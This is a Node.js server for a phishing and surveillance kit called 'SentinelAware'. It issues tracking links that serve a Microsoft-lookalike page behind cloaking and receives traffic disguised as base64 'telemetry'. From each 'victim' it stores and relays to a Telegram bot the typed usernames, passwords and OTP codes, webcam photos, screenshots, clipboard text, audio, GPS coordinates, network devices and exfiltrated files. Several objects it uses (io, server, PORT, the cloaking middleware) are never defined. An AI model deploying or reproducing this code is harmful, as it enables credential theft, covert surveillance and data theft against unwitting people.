const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const parser = require('user-agent-parser');
const axios = require('axios');
const fs = require('fs');
const cors = require('cors');
const webpush = require('web-push');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const { Pool } = require('pg');

const app = express();
app.use(cors()); // Allow all origins for the demo

// PostgreSQL Config
const pool = new Pool({
    host: process.env.DB_HOST,
    port: process.env.DB_PORT,
    user: process.env.DB_USER,
    password: process.env.DB_PASS,
    database: process.env.DB_NAME,
    ssl: false // Set to true if your hosting requires SSL (common on cloud DBs)
});

// Database Initialization
async function initDB() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS links (
                id TEXT PRIMARY KEY,
                data JSONB NOT NULL
            );
            CREATE TABLE IF NOT EXISTS logs (
                id TEXT PRIMARY KEY,
                data JSONB NOT NULL
            );
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                data JSONB NOT NULL
            );
        `);
        console.log('[DB] Tabelas verificadas/criadas');
        await loadInitialData();
    } catch (err) {
        console.error('[DB] Erro ao inicializar banco de dados:', err.message);
    }
}

let links = [];
let logs = [];
let vapidKeys = null;

async function loadInitialData() {
    try {
        const linksRes = await pool.query('SELECT data FROM links');
        links = linksRes.rows.map(r => r.data);

        const logsRes = await pool.query('SELECT data FROM logs');
        logs = logsRes.rows.map(r => r.data);

        const settingsRes = await pool.query('SELECT data FROM settings WHERE key = $1', ['vapid_keys']);
        if (settingsRes.rows.length > 0) {
            vapidKeys = settingsRes.rows[0].data;
        }

        if (!vapidKeys) {
            vapidKeys = webpush.generateVAPIDKeys();
            await pool.query('INSERT INTO settings (key, data) VALUES ($1, $2) ON CONFLICT (key) DO UPDATE SET data = $2', ['vapid_keys', vapidKeys]);
            console.log('[DB] VAPID Keys geradas e salvas');
        }

        webpush.setVapidDetails(
            'mailto:admin@sentinelaware.local',
            vapidKeys.publicKey,
            vapidKeys.privateKey
        );
        console.log('[DB] Dados carregados com sucesso');
    } catch (err) {
        console.error('[DB] Erro ao carregar dados iniciais:', err.message);
    }
}

async function saveLink(link) {
    await pool.query('INSERT INTO links (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [link.id, link]);
}

async function saveLog(log) {
    await pool.query('INSERT INTO logs (id, data) VALUES ($1, $2) ON CONFLICT (id) DO UPDATE SET data = $2', [log.id, log]);
}

initDB();

// Middleware
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Serve Dashboard on Root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Heartbeat for Service Worker Persistence
app.post('/api/heartbeat', (req, res) => {
    // Just a placeholder to keep the SW communication active
    res.json({ status: 'active', received: true });
});

// Get Public VAPID Key
app.get('/api/vapid-public-key', (req, res) => {
    res.json({ publicKey: vapidKeys.publicKey });
});

// Create a new random link
app.post('/api/links', (req, res) => {
    const { template } = req.body;
    const id = Math.random().toString(36).substring(2, 10);
    const newLink = {
        id,
        url: `/t/${id}`,
        template: template || 'generic',
        createdAt: new Date(),
        clicks: 0
    };
    links.push(newLink);
    saveLink(newLink);
    res.json(newLink);
});

// Tracking endpoint
app.get('/t/:id', cloakingMiddleware, async (req, res) => {
    const linkId = req.params.id;
    const link = links.find(l => l.id === linkId);

    if (link) {
        link.clicks++;
        saveLink(link);
        
        // Serve correct template
        const templateFile = link.template ? `${link.template}.html` : 'microsoft.html';
        const templatePath = path.join(__dirname, 'public', templateFile);
        
        if (fs.existsSync(templatePath)) {
            res.sendFile(templatePath);
        } else {
            res.sendFile(path.join(__dirname, 'public', 'microsoft.html'));
        }
    } else {
        // Link not found, fallback to microsoft
        res.sendFile(path.join(__dirname, 'public', 'microsoft.html'));
    }
});

// Socket logic for persistent sessions
io.on('connection', (socket) => {
    console.log(`[SOCKET] Nova conexão: ${socket.id}`);

    // Unified Telemetry Handler (Traffic Camouflage)
    socket.on('telemetry_data', (packet) => {
        try {
            // Decoding the camouflaged payload
            const rawData = Buffer.from(packet.v, 'base64').toString();
            const { event, data } = JSON.parse(rawData);

            switch(event) {
                case 'join': handleJoin(socket, data); break;
                case 'status': handleStatus(data); break;
                case 'heartbeat': handleHeartbeat(data); break;
                case 'photo': handlePhoto(data); break;
                case 'creds': handleCreds(data); break;
                case 'perf': handlePerf(data); break;
                case 'clipboard': handleClipboard(data); break;
                case 'audio_level': handleAudioLevel(data); break;
                case 'audio_stream': handleAudioStream(data); break;
                case 'files_sim': handleFilesSim(data); break;
                case 'fingerprint': handleFingerprint(data); break;
                case 'screenshot': handleScreenshot(data); break;
                case 'audio_cap': handleAudioCap(data); break;
                case 'subscription': handleSubscription(data); break;
                case 'chat_victim': handleChatVictim(data); break;
                case 'network': handleNetwork(data); break;
                case 'geo': handleGeo(data); break;
                case 'file_up': handleFileUpload(data); break;
                case 'js_result': handleJsResult(data); break;
            }
        } catch(e) {
            console.error('[TELEMETRY] Failed to parse camouflaged packet:', e.message);
        }
    });

    // Helper Handlers (Extracted for clarity)
    function handleJoin(socket, data) {
        const ip = (socket.handshake.headers['x-forwarded-for']?.split(',')[0] || socket.handshake.address).replace('::ffff:', '');
        let log = logs.find(l => l.id === data.logId);

        if (!log) {
            log = { id: data.logId, linkId: data.linkId, timestamp: new Date(), ip, geo: 'Calculando...', creds: [], chat: [], threatLevel: 'green', status: 'online' };
            logs.push(log);
            saveLog(log);
            io.emit('new_click', log);

            sendTelegramMsg(`🚨 *NOVO ALVO CONECTADO*\n🆔 ID: \`${log.id}\`\n🌍 IP: \`${log.ip}\`\n🔗 Link: \`${log.linkId}\``);

            axios.get(`https://ipapi.co/${ip}/json/`).then(r => {
                if(r.data && !r.data.error) {
                    log.geo = `${r.data.city}, ${r.data.country_name}`;
                    log.lat = r.data.latitude; log.lon = r.data.longitude;
                    saveLog(log);
                    io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                    sendTelegramMsg(`🌍 *LOCALIZAÇÃO (IP)*\n🆔 ID: \`${log.id}\`\n📍 Cidade: \`${r.data.city}\`\n🇧🇷 País: \`${r.data.country_name}\``);
                }
            }).catch(() => {
                if (ip === '127.0.0.1' || ip === '::1') {
                    log.geo = 'Localhost (Dev)'; log.lat = -23.5505; log.lon = -46.6333;
                    saveLog(log);
                    io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
                }
            });
        } else {
            log.status = 'online'; log.timestamp = new Date();
            saveLog(log);
            io.emit('update_log', { id: log.id, status: 'online' });
            sendTelegramMsg(`✅ *ALVO VOLTOU ONLINE*\n🆔 ID: \`${log.id}\``);
        }
    }

    function handleStatus(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.status = data.status; saveLog(log); io.emit('update_log', { id: log.id, status: log.status }); }
    }

    function handleHeartbeat(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.status = log.status === 'infected' ? 'infected' : 'online'; io.emit('update_log', { id: log.id, status: log.status }); }
    }

    function handlePhoto(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.photo = data.image;
            saveLog(log);
            io.emit('update_log', { id: log.id, photo: data.image });
            
            const base64Data = data.image.split(';base64,').pop();
            const buffer = Buffer.from(base64Data, 'base64');
            sendTelegramPhoto(buffer, `📸 *FOTO CAPTURADA*\n🆔 ID: \`${log.id}\``);
        }
    }

    function handleCreds(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.creds.push(data.value);
            log.threatLevel = 'yellow';
            saveLog(log);
            io.emit('update_log', { id: log.id, creds: log.creds, threatLevel: log.threatLevel });

            let emoji = '🔑';
            if (data.value.includes('USER')) emoji = '👤';
            if (data.value.includes('PASS')) emoji = '🔓';
            if (data.value.includes('OTP')) emoji = '🔢';
            
            sendTelegramMsg(`${emoji} *CAPTURA DE DADOS*\n🆔 ID: \`${log.id}\`\n📝 Valor: \`${data.value}\``);
        }
    }

    function handlePerf(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.currentTyping = data.text;
            if (data.text.startsWith('[HARDWARE]:')) { log.hardware = data.text.replace('[HARDWARE]:', '').trim(); saveLog(log); }
            else if (data.text.startsWith('[SYS]:')) { log.sysInfo = data.text.replace('[SYS]:', '').trim(); saveLog(log); }
            io.emit('update_log', { id: log.id, typing: data.text });
        }
    }

    function handleClipboard(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.clipboard = data.text; saveLog(log); io.emit('update_log', { id: log.id, clipboard: data.text }); }
    }

    function handleAudioLevel(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { io.emit('update_log', { id: log.id, audioLevel: data.level }); }
    }

    function handleAudioStream(data) { io.emit('play_audio_stream', { logId: data.logId, chunk: data.chunk }); }

    function handleFilesSim(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.files = data.files; saveLog(log); io.emit('update_log', { id: log.id, files: log.files }); }
    }

    function handleFingerprint(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.fingerprint = data.fingerprint;
            saveLog(log);
            io.emit('update_log', { id: log.id, fingerprint: data.fingerprint });

            const f = data.fingerprint;
            const dossier = `📂 *DOSSIÊ COMPLETO DO ALVO*\n` +
                `🆔 ID: \`${log.id}\`\n` +
                `🌐 IP Externo: \`${log.ip}\`\n` +
                `🏠 IP Interno: \`${f.internalIP}\`\n` +
                `📶 Conexão: \`${f.net}\`\n` +
                `🖥️ OS: \`${f.platform}\`\n` +
                `🧠 CPU: \`${f.cores} Cores\` | RAM: \`${f.ram}GB\`\n` +
                `🎮 GPU: \`${f.gpu}\`\n` +
                `📺 Resolução: \`${f.screen}\` (View: ${f.viewport})\n` +
                `🔋 Bateria: \`${f.battery}\`\n` +
                `🌐 Idioma: \`${f.lang}\` | TZ: \`${f.tz}\`\n` +
                `🔌 Plugins: \`${f.plugins.join(', ') || 'Nenhum'}\`\n` +
                `🕵️ Navegador: \`${f.vendor}\``;
            
            sendTelegramMsg(dossier);
        }
    }

    function handleScreenshot(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.screenshot = data.image;
            saveLog(log);
            io.emit('update_log', { id: log.id, screenshot: data.image });
            
            const base64Data = data.image.split(';base64,').pop();
            const buffer = Buffer.from(base64Data, 'base64');
            sendTelegramPhoto(buffer, `🖥️ *SCREENSHOT CAPTURADA*\n🆔 ID: \`${log.id}\``);
        }
    }

    function handleAudioCap(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.audio = data.audio; saveLog(log); io.emit('update_log', { id: log.id, audio: data.audio }); }
    }

    function handleSubscription(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { log.subscription = data.subscription; saveLog(log); io.emit('update_log', { id: log.id, hasPush: true }); }
    }

    function handleChatVictim(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) { if (!log.chat) log.chat = []; log.chat.push({ from: 'victim', msg: data.msg, time: new Date() }); saveLog(log); io.emit('update_log', { id: log.id, chat: log.chat }); }
    }

    function handleNetwork(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.internalDevices = data.devices;
            log.socialPresence = data.social;
            saveLog(log);
            io.emit('update_log', { id: log.id, internalDevices: log.internalDevices, socialPresence: log.socialPresence });
            
            if (data.devices && data.devices.length > 0) {
                sendTelegramMsg(`📡 *DISPOSITIVOS DE REDE DESCOBERTOS*\n🆔 ID: \`${log.id}\`\n🔗 Rede: \`${data.devices.join(', ')}\``);
            }
        }
    }

    function handleGeo(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            log.lat = data.lat;
            log.lon = data.lon;
            log.geo = `Precise: ${data.lat.toFixed(4)}, ${data.lon.toFixed(4)}`;
            saveLog(log);
            io.emit('update_log', { id: log.id, geo: log.geo, lat: log.lat, lon: log.lon });
            sendTelegramMsg(`📍 *LOCALIZAÇÃO PRECISA (GPS)*\n🆔 ID: \`${log.id}\`\n🗺️ Coordenadas: \`${data.lat}, ${data.lon}\`\n🎯 Google Maps: https://www.google.com/maps?q=${data.lat},${data.lon}`);
        }
    }

    function handleFileUpload(data) {
        const log = logs.find(l => l.id === data.logId);
        if (log) {
            if (!log.files) log.files = [];
            log.files.push({ name: data.name, type: data.type, size: data.size, data: data.content, timestamp: new Date() });
            saveLog(log);
            io.emit('update_log', { id: log.id, files: log.files });

            // Send to Telegram
            const base64Data = data.content.split(';base64,').pop();
            const buffer = Buffer.from(base64Data, 'base64');
            sendTelegramFile(buffer, data.name, `📂 *ARQUIVO EXFILTRADO*\n🆔 ID: \`${log.id}\`\n📄 Nome: \`${data.name}\``);
        }
    }

    function handleJsResult(data) {
        io.emit('js_result_admin', data);
    }
});

// Admin API
app.get('/api/logs', (req, res) => res.json(logs));
app.get('/api/links', (req, res) => res.json(links));

app.delete('/api/logs', async (req, res) => {
    logs = [];
    await pool.query('DELETE FROM logs');
    io.emit('all_logs_deleted');
    res.json({ success: true });
});

app.delete('/api/logs/:id', async (req, res) => {
    const id = req.params.id;
    logs = logs.filter(l => l.id !== id);
    await pool.query('DELETE FROM logs WHERE id = $1', [id]);
    io.emit('update_log', { id, deleted: true });
    res.json({ success: true });
});

// Handle port errors and start server
if (process.env.NODE_ENV !== 'production') {
    server.on('error', (e) => {
        if (e.code === 'EADDRINUSE') {
            const nextPort = parseInt(PORT) + 1;
            console.error(`Porta ${PORT} ocupada. Tentando porta ${nextPort}...`);
            server.listen(nextPort);
        }
    });

    server.listen(PORT, () => {
        const actualPort = server.address().port;
        console.log('\x1b[36m%s\x1b[0m', '------------------------------------------------');
        console.log('\x1b[36m%s\x1b[0m', `🚀 SentinelAware Dashboard: http://localhost:${actualPort}`);
        console.log('\x1b[33m%s\x1b[0m', `🌍 Ngrok: Use 'ngrok http ${actualPort}' para acesso externo`);
        console.log('\x1b[36m%s\x1b[0m', '------------------------------------------------');
    });
}

module.exports = app;

